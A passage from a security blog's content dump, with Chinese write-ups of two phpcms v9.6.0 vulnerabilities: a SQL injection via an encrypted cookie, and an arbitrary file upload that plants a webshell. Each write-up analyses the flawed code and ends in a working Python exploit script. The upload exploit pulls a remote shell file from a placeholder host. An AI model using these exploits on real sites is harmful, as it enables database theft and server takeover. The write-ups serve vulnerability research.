urlencode(safe_replace($_GET['filename'])); $json_str = json_encode($arr); $att_arr_exist = param::get_cookie('att_json'); $att_arr_exist_tmp = explode('||', $att_arr_exist); if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123; return true; &#125; else &#123; $json_str = $att_arr_exist ? $att_arr_exist.'||'.$json_str : $json_str; param::set_cookie('att_json',$json_str); return true; &#125; &#125; 先经过safe_replace 函数，过滤一遍，然后存入数组，如果不满足条件进入 set_cookie函数12345678910111213public static function set_cookie($var, $value = '', $time = 0) &#123; $time = $time &gt; 0 ? $time : ($value == '' ? SYS_TIME - 3600 : 0); $s = $_SERVER['SERVER_PORT'] == '443' ? 1 : 0; $var = pc_base::load_config('system','cookie_pre').$var; $_COOKIE[$var] = $value; if (is_array($value)) &#123; foreach($value as $k=&gt;$v) &#123; setcookie($var.'['.$k.']', sys_auth($v, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s); &#125; &#125; else &#123; setcookie($var, sys_auth($value, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s); &#125; &#125; 可以看到，对传入的value 进行一次sys_auth 然后setcookie，可以在返回包中拿到回显 最后还需要存在一个cookie，让我们不被跳转到main界面/Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/wap/index.php1234function __construct() &#123; $this-&gt;db = pc_base::load_model('content_model'); $this-&gt;siteid = isset($_GET['siteid']) &amp;&amp; (intval($_GET['siteid']) &gt; 0) ? intval(trim($_GET['siteid'])) : (param::get_cookie('siteid') ? param::get_cookie('siteid') : 1); param::set_cookie('siteid',$this-&gt;siteid); 通过GET方法得到$siteid，然后传到了set_cookie()函数中，满足条件。 攻击链： 访问 /index.php?m=wap&amp;a=index&amp;siteid=1 。获取响应头的set-Cookie字段。 将前一步获取到的字段赋值给userid_flash，作为POST参数。访问 /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=【payload】 获取返回头的set—Cookie字段，此即为加密后的payload 访问 /index.php?m=content&amp;c=down&amp;a_k=【加密后的payload】，注入成功。 0x02 Poc1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# -*- coding: utf-8 -*-# @Time : 2018-12-20 23:24# @Author : Patrilic# @FileName: sql_poc.py# @Software: PyCharmimport requestsimport reimport sysdef poc(url): try: step1 = url + \"/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1\" response = requests.get(step1) post = &#123; \"userid_flash\":response.cookies[\"okuga_siteid\"] &#125; print(\"[+] Get Cookie : \" + response.cookies[\"okuga_siteid\"]) # 获取cookie，避免登陆失效 step2 = url + \"//index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26\" response = requests.post(step2, post) # print(response.cookies) sqli_payload = response.cookies['okuga_att_json'] print(\"[+] Get Sqli_poc : \" + sqli_payload) # 获取加密 payload step3 = url + '/index.php?m=content&amp;c=down&amp;a_k=' + sqli_payload response = requests.get(step3) # print(response.text) user = re.findall(r'&lt;/b&gt;XPATH syntax error:(.*?)&lt;br /&gt;', response.text) # 注入 try: user[0] print(\"[+] Congraduations! This url is Vulnerable! \") except: print(\"[-] Not vulnerable!\") except: passdef main(): url = sys.argv[1] poc(url)if __name__ == '__main__': main()","categories":[],"tags":[]},{"title":"phpcms_v9.6.0 任意文件上传","slug":"phpcms_v9.6.0 任意文件上传","date":"2019-04-02T11:56:09.127Z","updated":"2019-04-03T02:51:26.596Z","comments":true,"path":"2019/04/02/phpcms_v9.6.0 任意文件上传/","link":"","permalink":"http://patrilic.top/2019/04/02/phpcms_v9.6.0 任意文件上传/","excerpt":"","text":"0x01 漏洞分析漏洞 url： http://localhost/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 跟进 /Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/member/index.php 漏洞代码从129行-136行1234567if($member_setting['choosemodel']) &#123; require_once CACHE_MODEL_PATH.'member_input.class.php'; require_once CACHE_MODEL_PATH.'member_update.class.php'; $member_input = new member_input($userinfo['modelid']); $_POST['info'] = array_map('new_html_special_chars',$_POST['info']); $user_model_info = $member_input-&gt;get($_POST['info']); &#125; $_POST[‘info’] 被函数 new_html_special_chars 过滤一遍1234567function new_html_special_chars($string) &#123; $encoding = 'utf-8'; if(strtolower(CHARSET)=='gbk') $encoding = 'ISO-8859-15'; if(!is_array($string)) return htmlspecialchars($string,ENT_QUOTES,$encoding); foreach($string as $key =&gt; $val) $string[$key] = new_html_special_chars($val); return $string;&#125; htmlspecialchars($string, ENT_QUOTES, $encoding)实体化编码 单引号和双引号1234567891011121314151617181920212223242526272829303132333435function get($data) &#123; $this-&gt;data = $data = trim_script($data); $model_cache = getcache('member_model', 'commons'); $this-&gt;db-&gt;table_name = $this-&gt;db_pre.$model_cache[$this-&gt;modelid]['tablename']; $info = array(); $debar_filed = array('catid','title','style','thumb','status','islink','description'); if(is_array($data)) &#123; foreach($data as $field=&gt;$value) &#123; if($data['islink']==1 &amp;&amp; !in_array($field,$debar_filed)) continue; $field = safe_replace($field); $name = $this-&gt;fields[$field]['name']; $minlength = $this-&gt;fields[$field]['minlength']; $maxlength = $this-&gt;fields[$field]['maxlength']; $pattern = $this-&gt;fields[$field]['pattern']; $errortips = $this-&gt;fields[$field]['errortips']; if(empty($errortips)) $errortips = \"$name ������Ҫ��\"; $length = empty($value) ? 0 : strlen($value); if($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(\"$name �������� $minlength ���ַ���\"); if (!array_key_exists($field, $this-&gt;fields)) showmessage('ģ���в�����'.$field.'�ֶ�'); if($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123; showmessage(\"$name ���ó��� $maxlength ���ַ���\"); &#125; else &#123; str_cut($value, $maxlength); &#125; if($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips); if($this-&gt;fields[$field]['isunique'] &amp;&amp; $this-&gt;db-&gt;get_one(array($field=&gt;$value),$field) &amp;&amp; ROUTE_A != 'edit') showmessage(\"$name ��ֵ�����ظ���\"); $func = $this-&gt;fields[$field]['formtype']; if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); $info[$field] = $value; &#125; &#125; return $info; &#125; 参数传入：首先经过 trim_script 函数， 过滤掉script和iframe1234567function trim_script($str) &#123; $str = preg_replace ( '/\\&lt;([\\/]?)script([^\\&gt;]*?)\\&gt;/si', '&amp;lt;\\\\1script\\\\2&amp;gt;', $str ); $str = preg_replace ( '/\\&lt;([\\/]?)iframe([^\\&gt;]*?)\\&gt;/si', '&amp;lt;\\\\1iframe\\\\2&amp;gt;', $str ); $str = preg_replace ( '/\\&lt;([\\/]?)frame([^\\&gt;]*?)\\&gt;/si', '&amp;lt;\\\\1frame\\\\2&amp;gt;', $str ); $str = preg_replace ( '/]]\\&gt;/si', ']] &gt;', $str ); return $str;&#125; 再经过safe_replace 函数，过滤特殊字符12345678910111213141516function safe_replace($string) &#123; $string = str_replace('%20','',$string); // 空格 $string = str_replace('%27','',$string); // 单引号 $string = str_replace('%2527','',$string); // 双重编码 $string = str_replace('*','',$string); $string = str_replace('\"','&amp;quot;',$string); $string = str_replace(\"'\",'',$string); $string = str_replace('\"','',$string); $string = str_replace(';','',$string); $string = str_replace('&lt;','&amp;lt;',$string); $string = str_replace('&gt;','&amp;gt;',$string); $string = str_replace(\"&#123;\",'',$string); $string = str_replace('&#125;','',$string); $string = str_replace('\\\\','',$string); return $string;&#125; 12$func = $this-&gt;fields[$field]['formtype']; if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); ediotr 方法1234567891011function editor($field, $value) &#123; $setting = string2array($this-&gt;fields[$field]['setting']); $enablesaveimage = $setting['enablesaveimage']; if(isset($_POST['spider_img'])) $enablesaveimage = 0; if($enablesaveimage) &#123; $site_setting = string2array($this-&gt;site_config['setting']); $watermark_enable = intval($site_setting['watermark_enable']); $value = $this-&gt;attachment-&gt;download('content', $value,$watermark_enable); &#125; return $value; &#125; $value = $this-&gt;attachment-&gt;download(‘content’, $value, $watermark_enable); 传入的被带入download函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445function download($field, $value,$watermark = '0',$ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = '') &#123; global $image_d; $this-&gt;att_db = pc_base::load_model('attachment_model'); $upload_url = pc_base::load_config('system','upload_url'); $this-&gt;field = $field; $dir = date('Y/md/'); $uploadpath = $upload_url.$dir; $uploaddir = $this-&gt;upload_root.$dir; $string = new_stripslashes($value); if(!preg_match_all(\"/(href|src)=([\\\"|']?)([^ \\\"'&gt;]+\\.($ext))\\\\2/i\", $string, $matches)) return $value; $remotefileurls = array(); foreach($matches[3] as $matche) &#123; if(strpos($matche, '://') === false) continue; dir_create($uploaddir); $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref); &#125; unset($matches, $string); $remotefileurls = array_unique($remotefileurls); $oldpath = $newpath = array(); foreach($remotefileurls as $k=&gt;$file) &#123; if(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue; $filename = fileext($file); $file_name = basename($file); $filename = $this-&gt;getname($filename); $newfile = $uploaddir.$filename; $upload_func = $this-&gt;upload_func; if($upload_func($file, $newfile)) &#123; $oldpath[] = $k; $GLOBALS['downloadfiles'][] = $newpath[] = $uploadpath.$filename; @chmod($newfile, 0777); $fileext = fileext($filename); if($watermark)&#123; watermark($newfile, $newfile,$this-&gt;siteid); &#125; $filepath = $dir.$filename; $downloadedfile = array('filename'=&gt;$filename, 'filepath'=&gt;$filepath, 'filesize'=&gt;filesize($newfile), 'fileext'=&gt;$fileext); $aid = $this-&gt;add($downloadedfile); $this-&gt;downloadedfiles[$aid] = $filepath; &#125; &#125; return str_replace($oldpath, $newpath, $value); &#125; waf： if(!preg_match_all(“/(href|src)=([\\”|’]?)([^ \\”‘&gt;]+.($ext))\\2/i”, $string, $matches)) return $value; 后缀：$ext = ‘gif|jpg|jpeg|bmp|png’使用 php#.jpg 绕过 进入到 fillurl 函数在 301 行去掉了 # \\$pos = strpos($surl,’#’); $remotefileurls = http://url/shell.php 0x02 漏洞复现 0x03 POC1234567891011121314151617181920212223# -*- coding: utf-8 -*-# @Time : 2018-12-20 22:57# @Author : Patrilic# @FileName: file_writein_poc.py# @Software: PyCharmimport requestsurl = 'http://localhost/phpcms_V9.6.0/install_package/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1'data = &#123; 'siteid': '1', 'modelid': '1', 'username': 'test', 'password': 'testxx', 'email': 'test@test.com', 'info[content]': '&lt;img src=http://url/shell.txt?.php#.jpg&gt;', 'dosubmit': '1',&#125;poc = requests.post(url,data= data)print(poc)","categories":[],"tags":[]},{"title":"About","slug":"Hello","date":"2019-04-01T03:20:33.000Z","updated":"2019-04-24T16:23:39.147Z","comments":true,"path":"2019/04/01/Hello/","link":"","permalink":"http://patrilic.top/2019/04/01/Hello/","excerpt":"","text":"Welcome To My Blog~A Security Lover ❤️ Red-Team, Web Security , ToolsAnd mylove: @Moc17a Wechat:","categories":[],"tags":[]}]}